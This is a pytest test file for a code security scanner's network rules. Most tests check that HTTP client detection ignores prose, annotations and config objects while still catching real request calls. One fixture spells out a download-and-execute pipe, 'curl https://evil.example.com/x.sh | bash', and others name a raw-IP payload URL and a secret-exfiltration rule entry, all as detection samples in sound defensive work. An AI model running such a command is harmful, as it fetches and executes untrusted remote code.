"""Tests for network access rules."""

from veyra.models import Finding, Severity
from veyra.rules.network import (
    collapse_http_claims,
    detect_download_execute,
    detect_http_client,
    detect_raw_ip_url,
    detect_shortener,
)
from veyra.scanner import scan_path


def test_http_client():
    f = detect_http_client("import requests", "x.py", 1)
    assert f is not None
    assert f.severity.value == "MEDIUM"


def test_http_client_is_code_not_prose():
    """A client name in English prose is not network access."""
    assert detect_http_client("so the next fetch is unconditional", "x.py", 1) is None
    assert detect_http_client("requests that share a transport", "x.py", 2) is None
    assert detect_http_client("what the parser got (after the fix)", "x.py", 3) is None
    assert detect_http_client("see the docs, fetch (see below)", "x.py", 4) is None


def test_urllib_parse_is_not_network():
    """urlparse never opens a connection; urllib.request does."""
    assert detect_http_client("from urllib.parse import urlparse", "x.py", 1) is None
    assert detect_http_client("urlparse(url)", "x.py", 2) is None
    f = detect_http_client("import urllib.request", "x.py", 3)
    assert f is not None
    assert detect_http_client("urllib.request.urlopen(url)", "x.py", 4) is not None


def test_urllib_request_record_is_not_a_request():
    """``urllib.request.Request`` is the record ``urlopen`` sends.

    Building one holds a URL, method, headers and body; it opens nothing. The
    line that names a request is the ``urlopen``/``urlretrieve`` one, and
    ``import urllib.request`` keeps the file-level claim.
    """
    assert detect_http_client("req = urllib.request.Request(url, headers={})", "x.py", 1) is None
    assert detect_http_client("req = urllib.request.Request(", "x.py", 2) is None
    assert detect_http_client(
        "def send(req: urllib.request.Request, *, timeout: float) -> None:", "x.py", 3
    ) is None
    # The request line still reports, including when it names the record too.
    assert detect_http_client("with urllib.request.urlopen(req, timeout=5) as r:", "x.py", 4) is not None
    assert detect_http_client(
        "urllib.request.urlopen(urllib.request.Request(url))", "x.py", 5
    ) is not None
    assert detect_http_client("urllib.request.urlretrieve(url, dest)", "x.py", 6) is not None
    assert detect_http_client("import urllib.request", "x.py", 7) is not None
    assert detect_http_client("from urllib.request import urlretrieve", "x.py", 8) is not None


def test_urllib_request_record_does_not_supersede_the_import():
    """A record construction is not a call, so the import claim survives it."""
    import_f = Finding(rule_id="AS-003", severity=Severity.MEDIUM, title="t", description="d",
                       file="src/a.py", line=1, evidence="HTTP client call",
                       remediation="r", matched_text="import urllib.request")
    record = Finding(rule_id="AS-003", severity=Severity.MEDIUM, title="t", description="d",
                     file="src/a.py", line=2, evidence="HTTP client call",
                     remediation="r", matched_text="req = urllib.request.Request(url)")
    kept = collapse_http_claims([import_f, record])
    assert [f.line for f in kept] == [1, 2]


def test_http_client_code_forms():
    for line in (
        "response = requests.get(url)",
        "client = httpx.Client(timeout=5)",
        "from aiohttp import ClientSession",
        "const r = await fetch(url)",
        "const r = await fetch(url)",
        "axios.get(url)",
        "const got = require('axios')",
        "node-fetch(url)",
    ):
        assert detect_http_client(line, "x.py", 1) is not None, line


def test_fetch_definition_method_call_and_prose_are_not_network_access():
    """``fetch`` is a network call only as the bare JS global.

    A Python definition, a method call on a local source object, and prose in
    a docstring/comment name no global request function.
    """
    for line in (
        "    def fetch(self, cfg: dict, home_path: Path) -> FetchResult:",
        "    return source.fetch(cfg, home_path)",
        '        """Run source.fetch() under a wall-clock budget; never raises."""',
        "    # ``fetch()``, precedence (mapped beats bulk; within a shape",
        "    async def fetch(url):",
        "    export function fetch(input: RequestInfo) {",
    ):
        assert detect_http_client(line, "x.py", 1) is None, line


def test_bare_fetch_call_still_counts_as_network_access():
    """The JS global (including ``window.fetch``) is still a call."""
    for line in (
        "const r = await fetch(url)",
        "window.fetch(url)",
        "return fetch(url, {method: 'POST'})",
    ):
        assert detect_http_client(line, "x.js", 1) is not None, line


def test_client_symbol_reference_is_not_network_access():
    """Naming a client symbol makes no request; only a call does."""
    for line in (
        "def send(response: httpx.Response) -> None:",
        "    except httpx.HTTPError as exc:",
        "client: httpx.Client = None",
        "typed = cast(httpx.Client, raw)",
        "raise aiohttp.ClientError from None",
        "# an ``httpx.Client`` whose lifetime is tied to the OpenAI client",
    ):
        assert detect_http_client(line, "x.py", 1) is None, line


def test_client_call_and_construction_are_network_access():
    """The call forms of the same symbols still count (no detection lost)."""
    for line in (
        "client = httpx.Client(timeout=5)",
        "session = requests.Session()",
        "with httpx.stream('GET', url) as resp:",
        "conn = aiohttp.ClientSession()",
        "resp = httpx.Response(200, content=b'')",
    ):
        assert detect_http_client(line, "x.py", 1) is not None, line


def test_client_import_still_carries_the_file_level_claim():
    """Dropping annotation lines must not lose the file's network capability."""
    findings = [
        detect_http_client(line, "x.py", i)
        for i, line in enumerate(
            ["import httpx", "def send(r: httpx.Response) -> None:"], 1
        )
    ]
    assert [f is not None for f in findings] == [True, False]


def test_quoted_import_is_a_mention_not_a_declaration():
    """A docstring that quotes an import states nothing the file can do.

    Field probe 2026-10-20 on the agent tree: the declaration branch had no
    mention guard, so ``The module wraps ``import requests`` for callers`` and
    a rule-catalogue row ``"fetch() call interpolating ..."`` each fired
    AS-003 MEDIUM on a line that cannot open a socket.
    """
    line = "The module wraps ``import requests`` for callers."
    assert detect_http_client(line, "src/doc.py", 3) is None
    catalogue = '"env_exfil_fetch", "critical", "exfiltration", "fetch() call interpolating secret"'
    assert detect_http_client(catalogue, "tools/guard.py", 116) is None
    prose = '"""Wall-clock budget the orchestrator enforces around fetch()."""'
    assert detect_http_client(prose, "src/base.py", 185) is None


def test_unquoted_import_still_declares_the_client():
    assert detect_http_client("import requests", "src/a.py", 1) is not None
    assert detect_http_client("from urllib import request", "src/a.py", 1) is not None
    assert detect_http_client("resp = requests.get(url)", "src/a.py", 1) is not None


def test_a_code_call_after_a_quoted_mention_still_counts():
    """The line is a mention only if *every* match on it is quoted."""
    line = 'note = "requests.get(url)" ; resp = httpx.get(url)'
    assert detect_http_client(line, "src/a.py", 1) is not None


def test_import_claim_survives_when_the_only_call_was_a_mention():
    """Collapsing needs a real call: a quoted one supersedes nothing."""
    findings = [
        Finding(rule_id="AS-003", severity=Severity.MEDIUM, title="t", description="d",
                file="src/a.py", line=1, evidence="HTTP client call",
                remediation="r", matched_text="import requests"),
        Finding(rule_id="AS-003", severity=Severity.MEDIUM, title="t", description="d",
                file="src/a.py", line=7, evidence="HTTP client call",
                remediation="r", matched_text='"""calls ``requests.get(url)`` once"""'),
    ]
    kept = collapse_http_claims(findings)
    assert [f.line for f in kept] == [1, 7]


def _http_medium_finding(file, line, text):
    return Finding(rule_id="AS-003", severity=Severity.MEDIUM, title="t", description="d",
                   file=file, line=line, evidence="HTTP client call",
                   remediation="r", matched_text=text)


def test_one_declaration_per_file_when_the_file_never_calls():
    """A file that only imports states availability once, on its first import.

    ``agent/process_bootstrap.py`` imports ``urllib.request`` once and ``httpx``
    twice in function bodies and never calls a client; the collapse dropped a
    declaration only against a *call*, so the file reported the same fact three
    times. The first declaration by line number is the survivor.
    """
    findings = [
        _http_medium_finding("src/a.py", 18, "import urllib.request"),
        _http_medium_finding("src/a.py", 310, "import httpx"),
        _http_medium_finding("src/a.py", 406, "import httpx"),
    ]
    kept = collapse_http_claims(findings)
    assert [f.line for f in kept] == [18]


def test_declaration_collapse_is_per_file_and_leaves_call_claims_alone():
    """Each file keeps its own claim: the rule is file-scoped, not global."""
    findings = [
        _http_medium_finding("src/a.py", 5, "import httpx"),
        _http_medium_finding("src/a.py", 9, "import httpx as _httpx"),
        _http_medium_finding("src/b.py", 3, "import requests"),
        _http_medium_finding("src/b.py", 40, "import requests as rq"),
        _http_medium_finding("src/c.py", 2, "import httpx"),
        _http_medium_finding("src/c.py", 11, "resp = httpx.get(url)"),
    ]
    kept = collapse_http_claims(findings)
    assert [(f.file, f.line) for f in kept] == [
        ("src/a.py", 5),
        ("src/b.py", 3),
        ("src/c.py", 11),
    ]


def test_download_execute():
    f = detect_download_execute("curl https://evil.example.com/x.sh | bash", "x.sh", 1)
    assert f is not None
    assert f.severity.value == "HIGH"


def test_raw_ip_url():
    f = detect_raw_ip_url('url = "http://192.168.1.1:8080/api"', "x.py", 1)
    assert f is not None
    assert f.severity.value == "MEDIUM"


def test_shortener():
    f = detect_shortener('url = "https://bit.ly/3abcXYZ"', "x.py", 1)
    assert f is not None
    assert f.severity.value == "LOW"


def test_ordinary_curl_not_download_execute():
    f = detect_download_execute("curl -o data.json https://example.com/data.json", "x.sh", 1)
    assert f is None


def test_loopback_raw_ip_is_not_external():
    # A dev-server probe on the loopback interface is not an external endpoint.
    assert detect_raw_ip_url('curl -s http://127.0.0.1:9229/json/list', "SKILL.md", 1) is None
    assert detect_raw_ip_url('curl -s http://127.0.0.1:9229/json/list', "SKILL.md", 2) is None
    assert detect_raw_ip_url('HOST=http://127.0.0.1:5174', "SKILL.md", 3) is None


def test_unspecified_raw_ip_is_not_external():
    assert detect_raw_ip_url('bind = "http://0.0.0.0:8000/health"', "x.py", 1) is None


def test_external_raw_ip_still_flagged():
    f = detect_raw_ip_url('url = "http://203.0.113.9/payload"', "x.py", 1)
    assert f is not None
    assert f.severity.value == "MEDIUM"


def test_private_lan_raw_ip_still_flagged():
    # RFC1918 is not loopback: an attacker can still choose a LAN endpoint.
    f = detect_raw_ip_url('url = "http://192.168.1.1:8080/api"', "x.py", 1)
    assert f is not None


def test_mixed_line_with_one_external_raw_ip_is_flagged():
    line = 'curl http://127.0.0.1:9229/x && curl http://203.0.113.9/y'
    f = detect_raw_ip_url(line, "x.sh", 1)
    assert f is not None


def test_malformed_octets_are_not_treated_as_local():
    f = detect_raw_ip_url('url = "http://999.1.1.1/x"', "x.py", 1)
    assert f is not None


def test_raw_ip_detector_is_registered_once():
    # AS-005 raw-IP lives in suspicious_urls.py; network.py only re-exports it.
    # A second @register in network.py made every hit appear twice in scans.
    from veyra.rules import suspicious_urls
    from veyra.rules.network import detect_raw_ip_url

    assert detect_raw_ip_url is suspicious_urls.detect_raw_ip
    assert detect_shortener is suspicious_urls.detect_shortener


def test_request_through_a_client_object_is_network_access():
    """The library name need not be spelled: the object carries the transport."""
    for line in (
        "async with session.post(url, headers=headers, json=payload) as resp:",
        "resp = await self._session.put(url, data=form)",
        "resp = await self._http_client.post(session_webhook, json=payload)",
        "response = self._httpx.post(endpoint + path)",
        "const req = https.request(url, {method}, res => {})",
        "req = client_options.http.request(opts)",
        "await session.delete(upload_url)",
        "return session.request(method, url, params=params)",
    ):
        assert detect_http_client(line, "x.py", 1) is not None, line


def test_object_form_keeps_prose_and_non_http_receivers_quiet():
    """A mention, a mapping read, and a queue are not requests.

    ``session.get('cwd')`` and ``_HTTP_CALL_ERRORS.get(code, ...)`` are
    dictionary lookups (691 ``<name>.get(`` lines in the field probe), and
    ``draftsBySession`` is a Map keyed by session id even though its name ends
    in ``session``.
    """
    for line in (
        "    # ``await session.post(...)`` leaves the response until GC",
        '    assert "await self._http_session.post(" not in src',
        'msg = _HTTP_CALL_ERRORS.get(e.code, "failed")',
        "draftsBySession.delete(key)",
        "session.get('cwd') or \"\"",
        "self._pending_input.put(msg)",
        "buf.delete()",
        "index.delete(ids=[\"vec1\"])",
        # ``get`` is not an HTTP-only verb, so this read stays unreported on
        # purpose (README, AS-003 residual cost); the file's import still
        # carries the capability claim.
        "response = self._httpx.get(endpoint + path)",
    ):
        assert detect_http_client(line, "x.py", 1) is None, line


def test_a_session_get_is_a_request_when_the_file_proves_the_receiver(tmp_path):
    """``client.get(url)`` is a request if this file built ``client`` as a session.

    The import claim is superseded: the request line is the claim that names
    something the file actually does. The construction keeps its own claim --
    collapsing those is a separate question, and the field count below shows
    why it is not decided here.
    """
    (tmp_path / "models.py").write_text(
        "import httpx\n"
        "\n"
        "\n"
        "def fetch_models(url: str) -> dict:\n"
        "    with httpx.Client(timeout=5) as client:\n"
        "        return client.get(url).json()\n"
    )
    assert [f.line for f in _http_medium(str(tmp_path))] == [5, 6]


def test_a_session_get_inside_a_multiline_construction_is_a_request(tmp_path):
    (tmp_path / "probe.py").write_text(
        "import httpx\n"
        "with httpx.Client(\n"
        "    timeout=httpx.Timeout(15.0),\n"
        "    headers={\"Accept\": \"application/json\"},\n"
        ") as client:\n"
        "    resp = client.get(probe_url)\n"
    )
    assert 6 in [f.line for f in _http_medium(str(tmp_path))]


def test_a_get_on_a_receiver_no_session_bound_stays_quiet(tmp_path):
    """The whole point: a mapping read and a foreign receiver are not requests.

    691 ``<name>.get(`` lines in the field probe are lookups; ``draftsBySession``
    is a Map keyed by session id; ``self._httpx.get(...)`` is a real request the
    file never proves a receiver for, so it stays residual rather than guessed.
    """
    (tmp_path / "dicts.py").write_text(
        "def read(session, draftsBySession, errors, self_httpx):\n"
        "    first = session.get('cwd')\n"
        "    draftsBySession.delete('draft-1')\n"
        "    other = self_httpx.get(endpoint)\n"
        "    return errors.get('code', 'failed'), first, other\n"
    )
    found = [(f.line, f.matched_text) for f in _http_medium(str(tmp_path))]
    assert found == []


def test_a_quoted_session_get_is_a_mention(tmp_path):
    (tmp_path / "noted.py").write_text(
        "import httpx\n"
        "client = httpx.Client()\n"
        "# ``client.get(url)`` is how the probe fetches the list\n"
    )
    assert [f.line for f in _http_medium(str(tmp_path))] == [2]


def test_a_session_bound_in_a_sibling_file_proves_nothing(tmp_path):
    """The proof is per file: ``a.py`` building a client says nothing about ``b.py``."""
    (tmp_path / "a.py").write_text("import httpx\nclient = httpx.Client()\n")
    (tmp_path / "b.py").write_text("def go(client, url):\n    return client.get(url)\n")
    found = {(f.file.rsplit("/", 1)[-1], f.line) for f in _http_medium(str(tmp_path))}
    assert found == {("a.py", 2)}


def test_the_line_rule_still_cannot_see_a_receiver():
    """``detect_http_client`` stays line-scoped; only the file rule can prove one."""
    assert detect_http_client("client.get(url)", "x.py", 1) is None


def _http_medium(target):
    return [
        f for f in scan_path(target).findings
        if f.rule_id == "AS-003" and f.severity.value == "MEDIUM"
    ]


def test_import_claim_is_collapsed_when_the_same_file_calls_the_client(tmp_path):
    """``import requests`` + ``requests.get(url)`` is one fact, not two."""
    (tmp_path / "client.py").write_text(
        "import requests\n\n\ndef go(url):\n    return requests.get(url)\n"
    )
    assert [f.line for f in _http_medium(str(tmp_path))] == [5]


def test_import_only_file_keeps_its_claim(tmp_path):
    """Nothing supersedes the import: the capability claim still stands."""
    (tmp_path / "uses.py").write_text(
        "import httpx\n\n\ndef send(r: httpx.Response) -> None:\n    return None\n"
    )
    assert [f.line for f in _http_medium(str(tmp_path))] == [1]


def test_a_call_in_another_file_does_not_suppress_the_import(tmp_path):
    """The collapse is per file: a sibling's call says nothing about this file."""
    (tmp_path / "a.py").write_text("import requests\n")
    (tmp_path / "b.py").write_text("import requests\nrequests.get('https://x.example')\n")
    found = {(f.file.rsplit("/", 1)[-1], f.line) for f in _http_medium(str(tmp_path))}
    assert found == {("a.py", 1), ("b.py", 2)}


def test_a_call_is_never_collapsed_even_on_the_import_line(tmp_path):
    """A line that declares and calls in one statement is still a call."""
    (tmp_path / "both.py").write_text("import requests; requests.get('https://x.example')\n")
    assert [f.line for f in _http_medium(str(tmp_path))] == [1]


def test_a_client_configuration_object_is_not_a_client():
    """A ``Timeout``/``Limits``/``URL``/``Auth`` value cannot open a connection.

    These are built to be passed *into* a client, and a line whose only HTTP
    symbol is one of them makes no request (field probe 2026-10-21: 16 of 334
    AS-003 MEDIUM on the slice were exactly this).
    """
    for line in (
        "timeout = httpx.Timeout(connect=15.0, read=None, write=15.0, pool=10.0)",
        "limits = httpx.Limits(max_keepalive_connections=20, max_connections=100)",
        "put_timeout = httpx.Timeout(",
        "httpx.URL(url), strict=strict_cfg_headers, configured_header_names=names)",
        'kwargs = {"timeout": aiohttp.ClientTimeout(total=timeout)}',
        "auth = httpx.BasicAuth(user, password)",
    ):
        assert detect_http_client(line, "x.py", 1) is None, line


def test_the_urllib_import_is_collapsed_when_the_file_makes_the_request(tmp_path):
    """``import urllib.request`` + ``urlopen`` is one fact, not two.

    The import line matches the ``urllib.request`` call alternative, so before
    the import-statement guard it was its own superseder and the per-file
    duplicate survived in exactly the files whose request line sat below it.
    """
    (tmp_path / "fetch.py").write_text(
        "import urllib.request\n\n\ndef go(url):\n"
        "    with urllib.request.urlopen(url, timeout=5) as r:\n"
        "        return r.read()\n"
    )
    assert [f.line for f in _http_medium(str(tmp_path))] == [5]


def test_a_from_urllib_request_import_is_collapsed_by_a_bare_urlopen(tmp_path):
    """``from urllib.request import urlopen`` is declared, ``urlopen(...)`` is used."""
    (tmp_path / "fetch.py").write_text(
        "from urllib.request import urlopen\n\n\nresp = urlopen(url)\n"
    )
    assert [f.line for f in _http_medium(str(tmp_path))] == [4]


def test_a_bare_urlretrieve_is_the_request_line(tmp_path):
    """``from urllib.request import urlretrieve`` + ``urlretrieve(...)`` is one fact.

    The tail listed ``urlopen`` but not ``urlretrieve``, so a file that imported
    the symbol and called it by the bare name had no request line at all and the
    download was reported only as an unused-looking import
    (``hermes_cli/update_cmd_zip.py:278,283``).
    """
    (tmp_path / "fetch.py").write_text(
        "def download(zip_url, zip_path):\n"
        "    from urllib.request import urlretrieve\n"
        "\n"
        "    urlretrieve(zip_url, zip_path)\n"
    )
    assert [f.line for f in _http_medium(str(tmp_path))] == [4]


def test_a_urlretrieve_name_reference_is_not_a_call():
    """Passing the function around names no request; only the call does."""
    assert detect_http_client("opener=urlretrieve", "x.py", 1) is None
    assert detect_http_client("urllib.request.urlretrieve(url, dest)", "x.py", 2) is not None


def test_a_urllib_import_without_a_request_line_keeps_its_claim(tmp_path):
    """No request line supersedes the import: a record and a handler are not calls."""
    (tmp_path / "handler.py").write_text(
        "import urllib.request\n\n\n"
        "def build(url, headers):\n"
        "    return urllib.request.Request(url, headers=headers)\n"
    )
    assert [f.line for f in _http_medium(str(tmp_path))] == [1]


def test_urllib_local_configuration_helpers_are_not_requests():
    """A proxy check and a ``file:`` URL conversion touch no socket.

    ``proxy_bypass_environment`` / ``proxy_bypass`` compare a hostname against
    NO_PROXY, ``url2pathname`` / ``pathname2url`` convert between a ``file:``
    URL string and a filesystem path. The module name alone is not a request;
    the request line is still ``urlopen`` / ``urlretrieve``.
    """
    assert detect_http_client(
        "return None if host and urllib.request.proxy_bypass_environment(host) else proxy",
        "x.py", 1,
    ) is None
    assert detect_http_client("raw = urllib.request.url2pathname(uri_path)", "x.py", 2) is None
    assert detect_http_client("uri = urllib.request.pathname2url(path)", "x.py", 3) is None
    assert detect_http_client("if urllib.request.proxy_bypass(host):", "x.py", 4) is None
    # The module still declares availability, and the request line still reports.
    assert detect_http_client("import urllib.request", "x.py", 5) is not None
    assert detect_http_client("urllib.request.urlopen(url)", "x.py", 6) is not None
    assert detect_http_client(
        "resp = urllib.request.urlopen(urllib.request.proxy_bypass_environment(h))",
        "x.py", 7,
    ) is not None


def test_a_local_configuration_helper_leaves_the_claim_on_the_import(tmp_path):
    """``import urllib.request`` + ``url2pathname(...)`` is one fact, at the import.

    The helper opens nothing, so no request line supersedes the declaration and
    the file keeps its single claim where the import put it -- the file still
    reports ``urllib.request`` availability, at file granularity.
    """
    (tmp_path / "files.py").write_text(
        "import urllib.request\n\n\n"
        "def to_path(uri_path):\n"
        "    return urllib.request.url2pathname(uri_path)\n"
    )
    assert [f.line for f in _http_medium(str(tmp_path))] == [1]


def test_a_client_constructed_around_a_configuration_object_still_counts():
    """The configuration list must not hide the client on the same line."""
    for line in (
        "with httpx.Client(timeout=httpx.Timeout(5.0)) as client:",
        "async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as s:",
        "self._http = http_client or httpx.Client(timeout=httpx.Timeout(connect=15.0))",
    ):
        assert detect_http_client(line, "x.py", 1) is not None, line


def test_an_import_of_a_timeout_is_not_a_network_client():
    """``from httpx import Timeout`` binds a value, not a transport.

    The declaration branch matches the library name, so a file whose only
    network symbol was a timeout class reported AS-003 MEDIUM. A timeout holds
    two numbers; ``Limits`` holds pool sizes; ``HTTPError`` is raised, not sent;
    ``ClientState`` is an enum. Field probe 2026-10-21 on the slice
    (agent/tools/skills/hermes_cli): three such lines were the only AS-003 claim
    of their file -- ``anthropic_adapter.py:307`` (``Timeout``),
    ``auxiliary_client.py:5399`` (``ClientState``, imported from the submodule),
    ``mcp_oauth_provider.py:87`` (``HTTPError``).
    """
    for line in (
        "from httpx import Timeout",
        "from httpx import Limits, URL",
        "from httpx import HTTPError",
        "from httpx._client import ClientState",
        "from aiohttp import ClientTimeout",
        "from requests import Timeout as _T",
    ):
        assert detect_http_client(line, "x.py", 1) is None, line


def test_an_import_that_binds_a_client_still_counts():
    """A client symbol keeps the claim, alone or beside a value object.

    The trade the configuration list makes elsewhere: only an import whose
    names are *all* values or exceptions goes quiet. ``from httpx import
    Timeout, Client`` still names a transport.
    """
    for line in (
        "import httpx",
        "import httpx as _httpx",
        "from httpx import Client",
        "from httpx import Timeout, Client",
        "from httpx._client import AsyncClient",
        "from requests import Session",
        "from requests import get",
        "from urllib import request as urlrequest",
    ):
        assert detect_http_client(line, "x.py", 1) is not None, line


def test_a_file_that_only_imports_a_value_object_reports_nothing(tmp_path):
    """End to end: the rejected declaration leaves the file with no claim."""
    (tmp_path / "adapter.py").write_text(
        "def _client_timeout(timeout):\n"
        "    from httpx import Timeout\n"
        "    return Timeout(timeout=float(timeout), connect=10.0)\n"
    )
    assert _http_medium(str(tmp_path)) == []


def test_a_value_object_import_does_not_hide_a_request_line(tmp_path):
    """The call is still the claim when the same file also imports a value."""
    (tmp_path / "adapter.py").write_text(
        "from httpx import Timeout\n"
        "import httpx\n"
        "\n"
        "resp = httpx.get('https://example.com', timeout=Timeout(5.0))\n"
    )
    findings = _http_medium(str(tmp_path))
    assert [f.line for f in findings] == [4]
